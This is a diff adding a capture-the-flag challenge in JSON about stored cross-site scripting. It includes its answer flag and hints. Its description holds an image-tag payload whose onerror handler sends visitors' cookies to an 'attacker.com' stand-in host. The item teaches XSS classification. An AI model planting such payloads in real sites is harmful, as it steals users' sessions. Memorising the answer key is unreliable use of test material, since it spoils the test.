@@ -1,0 +1,19 @@
+{
+  "id": "web-xss-002",
+  "title": "Stored XSS",
+  "category": "web",
+  "difficulty": "medium",
+  "points": 250,
+  "description": "A forum allows users to post comments. The comments are displayed to all visitors without sanitization.\n\nYou post this comment:\n<img src=x onerror=\"document.location='http://attacker.com/steal?c='+document.cookie\">\n\nThis is a type of XSS that persists on the server and affects every visitor.\n\nWhat is this XSS variant called (as opposed to 'reflected' XSS)?\n\nSubmit as: flag{xss_type} (lowercase)",
+  "flag": "flag{stored}",
+  "hints": [
+    "There are three main types of XSS: reflected, stored, and DOM-based",
+    "This payload is saved in the database and served to all users",
+    "Also called 'persistent' XSS"
+  ],
+  "resources": [
+    "https://portswigger.net/web-security/cross-site-scripting/stored",
+    "https://owasp.org/www-community/attacks/xss/"
+  ],
+  "ncl_category": "Web Application Exploitation"
+}
